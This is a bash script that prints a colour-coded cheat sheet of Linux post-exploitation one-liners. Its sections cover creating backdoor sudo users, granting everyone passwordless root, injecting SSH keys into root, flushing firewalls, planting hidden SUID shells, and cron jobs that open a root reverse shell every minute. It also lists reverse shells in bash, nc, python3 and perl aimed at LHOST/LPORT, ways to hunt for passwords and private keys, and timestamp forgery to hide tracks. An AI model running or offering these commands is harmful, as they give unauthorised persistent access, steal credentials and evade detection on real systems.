#!/usr/bin/env bash
# one-liners.sh — reference sheet, run to print, nothing executes
G='\033[0;32m';C='\033[0;36m';Y='\033[1;33m';B='\033[1m';D='\033[2m';NC='\033[0m'
hdr() { echo -e "\n${C}${B}━━  $*  ━━${NC}"; }
cmd() { printf "  ${Y}%-52s${NC} ${D}# %s${NC}\n" "$1" "$2"; }

hdr "USERS"
cmd "useradd -m -s /bin/bash -G sudo bob && echo 'bob:P@ss' | chpasswd"  "new sudo user"
cmd "echo 'bob:P@ss' | chpasswd"                                          "set password"
cmd "usermod -aG sudo bob"                                                "add to sudo group"
cmd "usermod -s /bin/bash bob"                                            "give user a shell"
cmd "grep -v '/nologin\|/false' /etc/passwd | cut -d: -f1"               "list shell users"
cmd "passwd -u bob"                                                       "unlock account"

hdr "SUDOERS"
cmd "echo 'bob ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/bob"             "full nopasswd root"
cmd "echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/00-all"          "everyone nopasswd (nuclear)"
cmd "visudo -c && echo ok"                                                "validate sudoers syntax"

hdr "SSH"
cmd "mkdir -p ~/.ssh && echo 'KEY' >> ~/.ssh/authorized_keys"             "inject key (current user)"
cmd "cat ~/.ssh/id_ed25519.pub >> /root/.ssh/authorized_keys"             "inject your key to root"
cmd "sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && systemctl restart sshd"  "enable root SSH"
cmd "sed -i 's/.*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config"              "enable password auth"
cmd "/usr/sbin/sshd -p 2222 &"                                            "second sshd on port 2222"

hdr "FIREWALL"
cmd "iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT; iptables -F"  "flush iptables"
cmd "nft flush ruleset"                                                   "flush nftables"
cmd "ufw disable"                                                         "disable ufw"
cmd "iptables -L -n --line-numbers"                                       "list rules with line numbers"

hdr "SUID / PRIVESC"
cmd "chmod u+s /bin/bash  # then:  bash -p"                              "SUID bash"
cmd "cp /bin/bash /tmp/.b && chmod u+s /tmp/.b  # then:  /tmp/.b -p"    "hidden SUID bash copy"
cmd "find / -perm -4000 -type f 2>/dev/null"                             "find existing SUID binaries"
cmd "find / -writable -type d 2>/dev/null | grep -v proc"                "find writable dirs"

hdr "CRON"
cmd "echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /etc/crontab"   "root revshell every minute"
cmd "echo '*/5 * * * * root echo KEY >> /root/.ssh/authorized_keys' >> /etc/crontab" "re-inject key every 5 min"
cmd "crontab -l"                                                          "list current user cron"
cmd "cat /etc/crontab; ls /etc/cron.d/"                                  "list system cron"

hdr "REVERSE SHELLS  (replace LHOST / LPORT)"
cmd "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"                               "bash"
cmd "bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"                     "bash (wrapped, for sh contexts)"
cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f"  "nc mkfifo"
cmd "nc -e /bin/bash LHOST LPORT"                                         "nc -e (if supported)"
cmd "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(['/bin/bash','-i'])\""  "python3"
cmd "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(LPORT,inet_aton(\"LHOST\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"  "perl"

hdr "RECON"
cmd "ss -tlnp"                                                            "listening ports + process"
cmd "ps aux --sort=-%cpu | head -20"                                      "top processes"
cmd "cat /etc/passwd | grep -v nologin | grep -v false"                   "real user accounts"
cmd "cat /etc/sudoers; cat /etc/sudoers.d/*"                              "who can sudo"
cmd "find / -mmin -10 -type f 2>/dev/null | grep -v /proc"               "files changed last 10 min"
cmd "grep -rIi 'password\s*=' /etc /var/www /opt 2>/dev/null | head -20" "grep configs for passwords"
cmd "find / -name id_rsa -o -name id_ed25519 2>/dev/null"                "find SSH private keys"
cmd "env; cat ~/.bash_history"                                            "env vars + history"
cmd "cat /proc/1/environ | tr '\\0' '\\n'"                               "process 0 environment"

hdr "NETWORK"
cmd "socat TCP-LISTEN:LPORT,fork TCP:RHOST:RPORT &"                      "port forward (socat)"
cmd "ssh -L LPORT:RHOST:RPORT user@jumphost -N &"                        "port forward (ssh local)"
cmd "ssh -R LPORT:localhost:22 user@yourbox -N &"                        "reverse tunnel to your box"
cmd "ip route; ip addr"                                                   "routing + interfaces"
cmd "cat /etc/hosts"                                                      "hosts file (find internal names)"

hdr "FILES"
cmd "touch -r /etc/passwd <target>"                                       "copy timestamps from /etc/passwd"
cmd "stat <file>"                                                         "full timestamp + inode info"
cmd "shred -uzn 3 <file>"                                                 "secure delete"
cmd "mv secret .secret"                                                   "hide file with dot prefix"
cmd "find / -name '*.conf' -o -name '*.env' 2>/dev/null | head -20"      "find config files"

echo
